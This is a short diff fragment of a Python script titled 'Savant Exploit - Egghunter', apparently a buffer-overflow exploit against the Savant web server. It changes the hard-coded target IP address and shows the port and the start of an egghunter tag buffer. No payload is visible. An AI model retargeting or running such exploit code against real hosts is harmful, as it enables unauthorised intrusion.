@@ -7,7 +7,7 @@ Savant Exploit - Egghunter
 #----------------------------------------------#
 """
 
-target_address="172.16.73.129"
+target_address="192.168.1.169"
 target_port=80
 
 buffer2 = "R0cX" + "R0cX" 
